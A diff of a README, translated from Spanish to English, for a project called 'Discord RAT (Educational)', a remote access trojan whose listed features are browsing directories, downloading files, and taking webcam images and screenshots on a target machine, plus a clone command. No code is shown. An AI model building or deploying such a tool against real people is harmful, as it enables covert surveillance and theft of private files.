@@ -1,17 +1,23 @@
 # Discord RAT (Educational)
 
-Este proyecto es una herramienta educativa creada para demostrar vulnerabilidades potenciales en dispositivos y concienciar sobre la importancia de la ciberseguridad.
+This project is an **educational tool** designed to demonstrate potential vulnerabilities in devices and raise awareness about the importance of cybersecurity.
 
-## Funcionalidades
-- Navegar entre directorios de la máquina.
-- Descargar archivos desde la máquina.
-- Capturar imágenes desde la cámara web.
-- Tomar capturas de pantalla.
+## Features
+- **Navigate** through directories on the target machine.
+- **Download** files from the target system.
+- **Capture images** using the target's webcam.
+- **Take screenshots** of the target's screen.
 
-## Propósito
-Este proyecto tiene un enfoque **educativo y preventivo**. **No debe ser utilizado con fines maliciosos.**
+## Purpose
+This project is created with an **educational and preventive focus**.  
+⚠️ **It must not be used for malicious purposes.** ⚠️
 
-## Instalación
-1. Clona este repositorio:
+## Installation
+
+Follow these steps to set up the project:
+
+1. **Clone the repository**:
+   
    ```bash
-   git clone https://github.com/tu-usuario/discord-rat.git
+   git clone https://github.com/gael-rs/discord-rat.git
+   cd discord-rat
